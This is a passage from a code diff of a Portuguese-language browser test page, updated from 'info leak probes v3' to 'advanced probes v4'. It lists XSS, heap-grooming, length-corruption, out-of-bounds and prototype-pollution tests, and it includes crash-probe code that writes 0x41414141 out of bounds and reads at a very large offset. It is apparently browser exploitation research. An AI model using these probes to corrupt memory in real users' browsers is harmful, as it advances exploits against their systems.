---",'test'); };
 
-        // --- Teste 6: Crash Probes (Mantido) ---
-        // ... (código do Teste 6 idêntico ao script v2) ...
-        const runCrashProbes = async () => { /* ... código igual ao v2 ... */ log("--- Iniciando Teste 6: Crash Probes (Pode Travar!) ---",'test'); log("AVISO: Tentará causar travamentos.",'warn'); const crashTest=async(description,crashFn)=>{ log(`Tentando Crash Probe: ${description}...`,'subtest'); try{ await crashFn(); log("Probe Ñ causou travamento.",'info'); } catch(e){ log(`Probe gerou erro JS (ñ crash): ${e.message}`,'warn'); } await new Promise(r=>setTimeout(r,SHORT_PAUSE)); }; await crashTest("OOB Write 0x41414141",async()=>{ const b=new ArrayBuffer(16); const dv=new DataView(b); const writeOffset=32; try{ log(`  Escrevendo 0x41414141 OOB @${writeOffset}...`,'crash'); dv.setUint32(writeOffset,0x41414141,true); dv.setUint32(writeOffset+4,0x41414141,true); } catch(e){log(`  Erro escrita OOB: ${e.message}`,'good');throw e;}}); await crashTest("OOB Read endereço alto",async()=>{ const b=new ArrayBuffer(16); const dv=new DataView(b); const readOffset=0x7FFFFFFF; try{ log(`  Lendo U32 OOB @${readOffset}...`,'crash'); const val=dv.getUint32(readOffset,true); log(`  Leitura retornou: ${val}`,'info'); } catch(e){log(`  Erro leitura OOB: ${e.message}`,'good');throw e;}}); log("--- Teste 6 Concluído (se ñ travou) ---",'test'); };
+        // --- Teste 6: Crash Probes (Mantido, opcional) ---
+        const runCrashProbes = async () => { /* ... código igual ao v3 ... */ log("--- Iniciando Teste 6: Crash Probes (Pode Travar!) ---",'test'); log("AVISO: Tentará causar travamentos.",'warn'); const crashTest=async(description,crashFn)=>{ log(`Tentando Crash Probe: ${description}...`,'subtest'); try{ await crashFn(); log("Probe Ñ causou travamento.",'info'); } catch(e){ log(`Probe gerou erro JS (ñ crash): ${e.message}`,'warn'); } await new Promise(r=>setTimeout(r,SHORT_PAUSE)); }; await crashTest("OOB Write 0x41414141",async()=>{ const b=new ArrayBuffer(16); const dv=new DataView(b); const writeOffset=32; try{ log(`  Escrevendo 0x41414141 OOB @${writeOffset}...`,'crash'); dv.setUint32(writeOffset,0x41414141,true); dv.setUint32(writeOffset+4,0x41414141,true); } catch(e){log(`  Erro escrita OOB: ${e.message}`,'good');throw e;}}); await crashTest("OOB Read endereço alto",async()=>{ const b=new ArrayBuffer(16); const dv=new DataView(b); const readOffset=0x7FFFFFFF; try{ log(`  Lendo U32 OOB @${readOffset}...`,'crash'); const val=dv.getUint32(readOffset,true); log(`  Leitura retornou: ${val}`,'info'); } catch(e){log(`  Erro leitura OOB: ${e.message}`,'good');throw e;}}); log("--- Teste 6 Concluído (se ñ travou) ---",'test'); };
 
 
         // --- Função Principal ---
         const runAll = async () => {
+             // Exibir User Agent logo no início
+             displayUserAgent();
+
              if (document.getElementById('runAllBtn')) document.getElementById('runAllBtn').disabled = true;
 
-            log("Iniciando todos os testes (INFO LEAK PROBES v3)...");
+            log("Iniciando todos os testes (ADVANCED PROBES v4)...");
             const tests = [
-                runCSP_XSS,                 // Teste 1 - XSS Base
-                runAdvancedLeakProbes_v3,   // Teste 2 - Advanced Info Leak v3 (NOVO)
-                runSprayAndCorrupt_v2,      // Teste 3 - Spray v2 (Ref.)
-                runOOBTestU8_Confirm,       // Teste 4 - OOB Confirm
-                runPPGadgets_v2,            // Teste 5 - PP Gadgets
-                runCrashProbes              // Teste 6 - Crash Probes
+                runCSP_XSS,              // Teste 1 - XSS Base
+                runHeapGroomingLeak_v4,  // Teste 2 - Heap Grooming + Leak v4 (NOVO)
+                runLengthCorruption_v4,  // Teste 3 - Corrupção de Length v4 (NOVO)
+                runOOBTestU8_Confirm,    // Teste 4 - OOB Confirm Base
+                runPPGadgets_v2,         // Teste 5 - PP Gadgets (Opcional)
+                runCrashProbes           // Teste 6 - Crash Probes (Opcional)
             ];
              for(let i=0; i < tests.length; i++){
                  if (!outputDiv) { console.error("Output div NULO, parando testes."); break; }
                  try {
-                     log(`--- EXECUTANDO TESTE ${i+1}/${tests.length} ---`, 'test');
+                     log(`--- EXECUTANDO TESTE ${i+1}/${tests.length}: ${tests[i].name} ---`, 'test'); // Nome da função no log
                      const testFn = tests[i]; const result = testFn();
                      if (result instanceof Promise) { await result; }
                  } catch(testError) { log(`ERRO INESPERADO TESTE ${i+1}: ${testError.message} ${testError.stack}`, 'error'); }
@@ -259,7 +285,7 @@
                     log(`Pausa ${PAUSE_DURATION}ms...`, 'info'); await new Promise(resolve => setTimeout(resolve, PAUSE_DURATION));
                  }
             }
-            if(outputDiv) log("\n\nTodos os testes INFO LEAK PROBES v3 concluídos. Revise o log.", 'test');
+            if(outputDiv) log("\n\nTodos os testes ADVANCED PROBES v4 concluídos. Revise o log.", 'test');
             else console.error("Script concluído, mas div log não disponível.");
              if (document.getElementById('runAllBtn')) document.getElementById('runAllBtn').disabled = false;
         };
@@ -267,8 +293,8 @@
         // Adicionar controles manuais atualizados
         document.getElementById('controls').innerHTML = `
             <button onclick="runCSP_XSS()">Rodar T1 (XSS)</button>
-            <button onclick="runAdvancedLeakProbes_v3()">Rodar T2 (Leak v3)</button>
-            <button onclick="runSprayAndCorrupt_v2()">Rodar T3 (Spray Ref.)</button>
+            <button onclick="runHeapGroomingLeak_v4()">Rodar T2 (Groom+Leak v4)</button>
+            <button onclick="runLengthCorruption_v4()">Rodar T3 (Length Corr. v4)</button>
             <button onclick="runOOBTestU8_Confirm()">Rodar T4 (OOB Confirm)</button>
             <button onclick="runPPGadgets_v2()">Rodar T5 (PP Gadgets)</button>
             <button onclick="runCrashProbes()">Rodar T6 (Crash Probes)</button>
@@ -277,6 +303,9 @@
             <span style="margin-left: 5px;">Teste JS Link (T1): </span>
             <a id="js-link-placeholder" href="#" style="color:orange">[Link JS URI será injetado aqui]</a>
         `;
+
+        // Rodar displayUserAgent imediatamente ao carregar o script
+        displayUserAgent();
 
         // Opcional: Rodar tudo automaticamente ao carregar?
         // document.addEventListener('DOMContentLoaded', runAll);
